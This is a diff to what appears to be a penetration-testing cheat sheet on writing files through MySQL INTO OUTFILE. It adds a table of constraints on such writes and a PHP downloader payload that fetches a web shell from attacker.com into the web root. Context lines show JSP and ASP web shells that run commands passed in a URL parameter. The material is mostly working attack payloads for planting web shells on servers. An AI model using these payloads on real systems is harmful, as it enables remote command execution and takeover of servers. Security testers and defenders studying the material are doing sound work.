@@ -20,6 +20,15 @@ To write files from MySQL, the following conditions must be met:
 3. You must know the absolute path where you want to write
 4. The `secure_file_priv` setting must either be empty or set to a directory where you can write
 
+### Important Constraints
+
+| Constraint         | Description                                                                    |
+| ------------------ | ------------------------------------------------------------------------------ |
+| No Overwriting     | INTO OUTFILE/DUMPFILE cannot overwrite existing files                          |
+| Statement Position | The INTO clause must be the last statement in the query                        |
+| Pathname Quoting   | Quotation marks are mandatory for pathnames (hex encoding like 0x cannot work) |
+| Max Packet Size    | Limited by `@@max_allowed_packet` (default ~1MB)                               |
+
 ### Methods for Writing Files
 
 MySQL provides two primary statements for writing to files:
@@ -91,6 +100,14 @@ SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRunti
 
 ```sql
 SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
+```
+
+#### PHP Downloader (Bypass size limits)
+
+If the query length is limited, write a small downloader to fetch the full shell:
+
+```sql
+SELECT '<?php fwrite(fopen("shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
 ```
 
 ### Writing Multiple Lines
